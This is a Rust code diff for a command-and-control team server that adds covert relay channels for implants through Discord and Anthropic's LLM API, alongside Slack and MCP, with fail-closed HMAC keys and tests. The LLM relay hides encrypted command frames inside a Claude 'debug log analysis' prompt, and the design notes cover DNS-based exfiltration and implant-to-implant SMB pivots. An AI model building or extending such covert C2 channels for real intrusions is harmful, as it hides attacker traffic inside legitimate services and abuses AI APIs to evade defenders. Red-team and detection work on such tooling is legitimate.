@@ -69,13 +69,16 @@
 //! owns an HTTP agent and per-channel rate-limit/cooldown state that must
 //! persist across calls) instead of being rebuilt per relay call.
 //!
-//! ## Why only Slack + MCP here
+//! ## Why Slack + LLM + Discord + MCP
 //!
-//! The four external-C2 channels in `crates/transport/src/` are Slack, LLM,
-//! MCP, and (via the transport crate's `MalleableTransport`) the HTTP profile
-//! detail. This module wires the two highest-value, most-tested relays as a
-//! proof-of-concept and leaves clear design notes for the remaining channels.
-//! See the per-channel notes at the bottom of this file.
+//! The external-C2 channels in `crates/transport/src/` are Slack, LLM,
+//! Discord, MCP, DoH, Malleable and SMB. This module wires the four
+//! third-party-API relays — Slack, LLM, Discord, MCP — into the shared stack.
+//! DoH belongs behind an authoritative DNS responder rather than an axum
+//! relay route (see `crates/server/src/dns_responder.rs`); Malleable is
+//! already served by the server's `nyx-profile` path; SMB is an
+//! implant↔implant pivot, not a server relay. See the per-channel notes at
+//! the bottom of this file.
 
 use std::sync::{Arc, Mutex};
 
@@ -128,8 +131,14 @@ pub struct ExtC2RelayConfig {
     /// MCP server URL + bearer key + session ID. `None` when the MCP relay
     /// is disabled.
     pub mcp: Option<McpRelay>,
+    /// Anthropic LLM API key + model + session key. `None` when the LLM
+    /// relay is disabled.
+    pub llm: Option<LlmRelay>,
+    /// Discord bot token + channel ID + HMAC key. `None` when the Discord
+    /// relay is disabled.
+    pub discord: Option<DiscordRelay>,
     /// The ONE shared transport stack, built at boot by
-    /// [`ExtC2RelayConfig::from_env`] when any relay is enabled. Both relay
+    /// [`ExtC2RelayConfig::from_env`] when any relay is enabled. All relay
     /// entry points lock this and send — no per-call transport construction.
     /// `None` when no relay is enabled.
     pub stack: Option<Arc<Mutex<TransportStack>>>,
@@ -139,6 +148,8 @@ impl std::fmt::Debug for ExtC2RelayConfig {
     fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
         f.debug_struct("ExtC2RelayConfig")
             .field("slack", &self.slack.is_some())
+            .field("llm", &self.llm.is_some())
+            .field("discord", &self.discord.is_some())
             .field("mcp", &self.mcp.is_some())
             .field("stack", &self.stack.is_some())
             .finish()
@@ -161,6 +172,30 @@ pub struct McpRelay {
     pub server_url: Arc<str>,
     pub api_key: Arc<str>,
     pub session_id: Arc<str>,
+}
+
+#[derive(Clone)]
+pub struct LlmRelay {
+    pub api_key: Arc<str>,
+    pub model: Arc<str>,
+    /// 32-byte session secret for relayed-frame integrity (CRITICAL-23).
+    /// Derived from NYX_EXTC2_LLM_SESSION_KEY (hex-encoded 32 bytes) at boot,
+    /// domain-separated per channel by the transport. Both the team server
+    /// and the LLM-polling implant must share this key so the implant can
+    /// verify the tag on relayed frames.
+    pub session_key: [u8; 32],
+}
+
+#[derive(Clone)]
+pub struct DiscordRelay {
+    pub bot_token: Arc<str>,
+    pub channel_id: Arc<str>,
+    /// HMAC-SHA256 key for transport-layer frame integrity (CRITICAL-22
+    /// pattern). Derived from NYX_EXTC2_DISCORD_HMAC_KEY (hex-encoded 32
+    /// bytes) at boot. Both the team server and the Discord-polling implant
+    /// must share this key so the implant can verify the tag on relayed
+    /// frames.
+    pub session_key: [u8; 32],
 }
 
 impl ExtC2RelayConfig {
@@ -217,17 +252,81 @@ impl ExtC2RelayConfig {
             _ => None,
         };
 
+        // LLM (Anthropic) relay: key + model + a 32-byte session key shared
+        // with the LLM-beacon out-of-band. The session key is REQUIRED and
+        // fail-closed (same contract as Slack's HMAC key): without it a third
+        // party who can prompt the model could inject relayed frames
+        // (CRITICAL-23).
+        let llm: Option<LlmRelay> = match (
+            std::env::var("NYX_EXTC2_LLM_KEY"),
+            std::env::var("NYX_EXTC2_LLM_MODEL"),
+        ) {
+            (Ok(key), Ok(model)) if !key.is_empty() && !model.is_empty() => {
+                let session_hex = std::env::var("NYX_EXTC2_LLM_SESSION_KEY").map_err(|_| {
+                    "NYX_EXTC2_LLM_SESSION_KEY is required when the LLM relay is enabled \
+                     (NYX_EXTC2_LLM_KEY and NYX_EXTC2_LLM_MODEL are both set); refusing \
+                     to start with unauthenticated relayed frames"
+                        .to_string()
+                })?;
+                let session_key = decode_hmac_key(&session_hex)?;
+                Some(LlmRelay {
+                    api_key: key.into(),
+                    model: model.into(),
+                    session_key,
+                })
+            }
+            _ => None,
+        };
+
+        // Discord relay: bot token + channel ID + HMAC key. Same fail-closed
+        // HMAC contract as Slack — without it anyone who can post into the
+        // channel could forge relayed frames.
+        let discord: Option<DiscordRelay> = match (
+            std::env::var("NYX_EXTC2_DISCORD_TOKEN"),
+            std::env::var("NYX_EXTC2_DISCORD_CHANNEL"),
+        ) {
+            (Ok(token), Ok(channel)) if !token.is_empty() && !channel.is_empty() => {
+                let hmac_hex = std::env::var("NYX_EXTC2_DISCORD_HMAC_KEY").map_err(|_| {
+                    "NYX_EXTC2_DISCORD_HMAC_KEY is required when the Discord relay is \
+                     enabled (NYX_EXTC2_DISCORD_TOKEN and NYX_EXTC2_DISCORD_CHANNEL are \
+                     both set); refusing to start with a guessable HMAC key"
+                        .to_string()
+                })?;
+                let session_key = decode_hmac_key(&hmac_hex)?;
+                Some(DiscordRelay {
+                    bot_token: token.into(),
+                    channel_id: channel.into(),
+                    session_key,
+                })
+            }
+            _ => None,
+        };
+
         // Build the ONE shared transport stack when any relay is enabled. The
         // transports are constructed here at boot, not per relay call: each
         // owns an HTTP agent and per-channel rate-limit/cooldown state that
         // must persist across calls (e.g. Slack's 1.2 s inter-message gap).
-        let stack = if slack.is_some() || mcp.is_some() {
+        let stack = if slack.is_some() || mcp.is_some() || llm.is_some() || discord.is_some() {
             let mut builder = TransportStack::builder();
             if let Some(s) = &slack {
                 builder = builder.push(SlackTransport::new(
                     s.bot_token.to_string(),
                     s.channel_id.to_string(),
                     &s.session_key,
+                ));
+            }
+            if let Some(l) = &llm {
+                builder = builder.push(nyx_transport::llm_api::LlmApiTransport::new(
+                    l.api_key.to_string(),
+                    l.model.to_string(),
+                    l.session_key,
+                ));
+            }
+            if let Some(d) = &discord {
+                builder = builder.push(nyx_transport::discord_api::DiscordTransport::new(
+                    d.bot_token.to_string(),
+                    d.channel_id.to_string(),
+                    &d.session_key,
                 ));
             }
             if let Some(m) = &mcp {
@@ -245,13 +344,19 @@ impl ExtC2RelayConfig {
             None
         };
 
-        Ok(ExtC2RelayConfig { slack, mcp, stack })
+        Ok(ExtC2RelayConfig {
+            slack,
+            mcp,
+            llm,
+            discord,
+            stack,
+        })
     }
 
     /// True iff at least one channel's relay is configured. When false the
     /// server doesn't need to spawn any background relay tasks at all.
     pub fn any_enabled(&self) -> bool {
-        self.slack.is_some() || self.mcp.is_some()
+        self.slack.is_some() || self.mcp.is_some() || self.llm.is_some() || self.discord.is_some()
     }
 }
 
@@ -318,36 +423,50 @@ pub fn relay_reply_to_mcp(cfg: &ExtC2RelayConfig, reply_frame: Vec<u8>) {
     }
 }
 
+/// Relay `reply_frame` to the configured LLM (Anthropic) API via the shared
+/// boot-time [`TransportStack`]. Same fire-and-forget semantics and
+/// shared-stack behaviour as [`relay_reply_to_slack`]: the frame is sealed,
+/// hex-encoded, and embedded in a Claude "debug log analysis" prompt.
+pub fn relay_reply_to_llm(cfg: &ExtC2RelayConfig, reply_frame: Vec<u8>) {
+    if let Some(stack) = &cfg.stack {
+        relay_via_stack("llm", Arc::clone(stack), reply_frame);
+    }
+}
+
+/// Relay `reply_frame` to the configured Discord channel via the shared
+/// boot-time [`TransportStack`]. Same fire-and-forget semantics and
+/// shared-stack behaviour as [`relay_reply_to_slack`]: the frame is sealed,
+/// base64-encoded, and posted as a bot message a Discord-beacon polling
+/// `messages` would see.
+pub fn relay_reply_to_discord(cfg: &ExtC2RelayConfig, reply_frame: Vec<u8>) {
+    if let Some(stack) = &cfg.stack {
+        relay_via_stack("discord", Arc::clone(stack), reply_frame);
+    }
+}
+
 // ── Remaining-channel design notes ────────────────────────────────────────
 //
-// The other transport-crate channels are NOT wired here yet. Each is a
-// straightforward extension of the pattern above once its env-var contract is
-// decided:
-//
-// **LLM (Anthropic)** — `crates/transport/src/llm_api.rs::LlmApiTransport`.
-//   Needs `NYX_EXTC2_LLM_KEY` + `NYX_EXTC2_LLM_MODEL` + a 32-byte session key
-//   (XOR obfuscation layer). The session-key piece is the hold-up: it must be
-//   agreed between server and the LLM-beacon out-of-band, and the current
-//   transport takes a raw `[u8;32]`. Skipping until the key-exchange story is
-//   settled (the protocol-layer ChaCha20-Poly1305 AEAD is the real crypto
-//   anyway; the XOR is only cosmetic shaping).
+// All four third-party-API relays (Slack / LLM / Discord / MCP) are wired
+// above. The remaining transport-crate channels intentionally do NOT go
+// through this relay:
 //
 // **DoH DNS** — `crates/transport/src/doh_dns.rs::DohDnsTransport`. This one
-//   doesn't fit the relay model cleanly: a DoH-beacon exfils via DNS query
-//   names and infils via TXT records, which means the server side is an
-//   authoritative DNS server, not an HTTP relay. It belongs behind a dedicated
-//   UDP/53 listener, not an axum route. Out of scope for this integration.
+//   doesn't fit the relay model: a DoH-beacon exfils via DNS query names and
+//   infils via TXT records, which means the server side is an authoritative
+//   DNS responder, not an HTTP relay. Wired as `crates/server/src/dns_responder.rs`
+//   (HTTP JSON DoH endpoint + UDP/53 wire responder).
 //
-// **Malleable** — `crates/transport/src/malleable.rs::MalleableTransport`.
-//   Already conceptually covered by the server's existing Malleable C2 profile
-//   support (`nyx-profile`, served at profile-declared transaction URIs). The
-//   transport crate's version is a standalone client useful for dev harnesses;
-//   wiring it as a relay would duplicate the profile path. Skip.
+// **Malleable** — Already conceptually covered by the server's existing
+//   Malleable C2 profile support (`nyx-profile`, served at profile-declared
+//   transaction URIs). The transport crate's `MalleableTransport` is a
+//   standalone client useful for dev harnesses; wiring it as a relay would
+//   duplicate the profile path. Skip.
 //
 // **SMB pipe** — `crates/transport/src/smb_pipe.rs::SmbPipeTransport`. This is
 //   a peer-to-peer pivot transport (implant↔implant via named pipe), NOT a
-//   server-side relay. The server has no business calling it; it's consumed
-//   implant-side by the existing `implant-win/src/channels/smb.rs`. Skip.
+//   server-side relay. The server hosts the parent pipe listener on Windows
+//   (`crates/server/src/smb_listener.rs`); the implant child side lives in
+//   `implant-win/src/channels/smb.rs`.
 
 #[cfg(test)]
 mod tests {
@@ -360,6 +479,8 @@ mod tests {
         let cfg = ExtC2RelayConfig::from_env().unwrap();
         assert!(cfg.slack.is_none());
         assert!(cfg.mcp.is_none());
+        assert!(cfg.llm.is_none());
+        assert!(cfg.discord.is_none());
         assert!(cfg.stack.is_none());
         assert!(!cfg.any_enabled());
     }
@@ -383,6 +504,8 @@ mod tests {
         // Enabling any relay builds the ONE shared stack at boot.
         assert!(cfg.stack.is_some(), "slack enabled ⇒ shared stack built");
         assert!(cfg.mcp.is_none());
+        assert!(cfg.llm.is_none());
+        assert!(cfg.discord.is_none());
         assert!(cfg.any_enabled());
         clear_all_env();
     }
@@ -438,6 +561,100 @@ mod tests {
     }
 
     #[test]
+    fn from_env_enables_llm_when_all_three_vars_set() {
+        let _g = ENV_LOCK.lock();
+        clear_all_env();
+        std::env::set_var("NYX_EXTC2_LLM_KEY", "sk-ant-test");
+        std::env::set_var("NYX_EXTC2_LLM_MODEL", "claude-sonnet-4-5");
+        std::env::set_var("NYX_EXTC2_LLM_SESSION_KEY", "ab".repeat(32));
+        let cfg = ExtC2RelayConfig::from_env().unwrap();
+        assert!(cfg.llm.is_some(), "llm should be enabled");
+        assert_eq!(&*cfg.llm.as_ref().unwrap().api_key, "sk-ant-test");
+        assert_eq!(&*cfg.llm.as_ref().unwrap().model, "claude-sonnet-4-5");
+        assert!(cfg.stack.is_some(), "llm enabled ⇒ shared stack built");
+        assert!(cfg.slack.is_none());
+        assert!(cfg.any_enabled());
+        clear_all_env();
+    }
+
+    #[test]
+    fn from_env_fails_closed_when_llm_enabled_without_session_key() {
+        let _g = ENV_LOCK.lock();
+        clear_all_env();
+        std::env::set_var("NYX_EXTC2_LLM_KEY", "sk-ant-test");
+        std::env::set_var("NYX_EXTC2_LLM_MODEL", "claude-sonnet-4-5");
+        // NYX_EXTC2_LLM_SESSION_KEY deliberately unset → boot must fail.
+        let err = ExtC2RelayConfig::from_env().unwrap_err();
+        assert!(
+            err.contains("NYX_EXTC2_LLM_SESSION_KEY"),
+            "fail-closed error must name the missing key: {err}"
+        );
+        clear_all_env();
+    }
+
+    #[test]
+    fn from_env_ignores_partial_llm_config() {
+        let _g = ENV_LOCK.lock();
+        clear_all_env();
+        std::env::set_var("NYX_EXTC2_LLM_KEY", "sk-ant-test");
+        // NYX_EXTC2_LLM_MODEL deliberately unset.
+        let cfg = ExtC2RelayConfig::from_env().unwrap();
+        assert!(
+            cfg.llm.is_none(),
+            "a key without a model must not enable the relay"
+        );
+        assert!(cfg.stack.is_none());
+        clear_all_env();
+    }
+
+    #[test]
+    fn from_env_enables_discord_when_all_three_vars_set() {
+        let _g = ENV_LOCK.lock();
+        clear_all_env();
+        std::env::set_var("NYX_EXTC2_DISCORD_TOKEN", "discord-bot-token");
+        std::env::set_var("NYX_EXTC2_DISCORD_CHANNEL", "123456789012345678");
+        std::env::set_var("NYX_EXTC2_DISCORD_HMAC_KEY", "cd".repeat(32));
+        let cfg = ExtC2RelayConfig::from_env().unwrap();
+        assert!(cfg.discord.is_some(), "discord should be enabled");
+        assert_eq!(
+            &*cfg.discord.as_ref().unwrap().channel_id,
+            "123456789012345678"
+        );
+        assert!(cfg.stack.is_some(), "discord enabled ⇒ shared stack built");
+        assert!(cfg.slack.is_none());
+        assert!(cfg.llm.is_none());
+        assert!(cfg.any_enabled());
+        clear_all_env();
+    }
+
+    #[test]
+    fn from_env_fails_closed_when_discord_enabled_without_hmac_key() {
+        let _g = ENV_LOCK.lock();
+        clear_all_env();
+        std::env::set_var("NYX_EXTC2_DISCORD_TOKEN", "discord-bot-token");
+        std::env::set_var("NYX_EXTC2_DISCORD_CHANNEL", "123456789012345678");
+        // NYX_EXTC2_DISCORD_HMAC_KEY deliberately unset → boot must fail.
+        let err = ExtC2RelayConfig::from_env().unwrap_err();
+        assert!(
+            err.contains("NYX_EXTC2_DISCORD_HMAC_KEY"),
+            "fail-closed error must name the missing key: {err}"
+        );
+        clear_all_env();
+    }
+
+    #[test]
+    fn from_env_ignores_partial_discord_config() {
+        let _g = ENV_LOCK.lock();
+        clear_all_env();
+        std::env::set_var("NYX_EXTC2_DISCORD_TOKEN", "discord-bot-token");
+        // NYX_EXTC2_DISCORD_CHANNEL deliberately unset.
+        let cfg = ExtC2RelayConfig::from_env().unwrap();
+        assert!(cfg.discord.is_none());
+        assert!(cfg.stack.is_none());
+        clear_all_env();
+    }
+
+    #[test]
     fn from_env_enables_mcp_when_all_three_vars_set() {
         let _g = ENV_LOCK.lock();
         clear_all_env();
@@ -488,6 +705,12 @@ mod tests {
             "NYX_EXTC2_MCP_URL",
             "NYX_EXTC2_MCP_KEY",
             "NYX_EXTC2_MCP_SESSION",
+            "NYX_EXTC2_LLM_KEY",
+            "NYX_EXTC2_LLM_MODEL",
+            "NYX_EXTC2_LLM_SESSION_KEY",
+            "NYX_EXTC2_DISCORD_TOKEN",
+            "NYX_EXTC2_DISCORD_CHANNEL",
+            "NYX_EXTC2_DISCORD_HMAC_KEY",
         ] {
             std::env::remove_var(k);
         }
@@ -501,8 +724,7 @@ mod tests {
                 channel_id: "C1".into(),
                 session_key: [0u8; 32],
             }),
-            mcp: None,
-            stack: None,
+            ..Default::default()
         };
         let s = format!("{cfg:?}");
         // Debug must show only presence, never the token value.
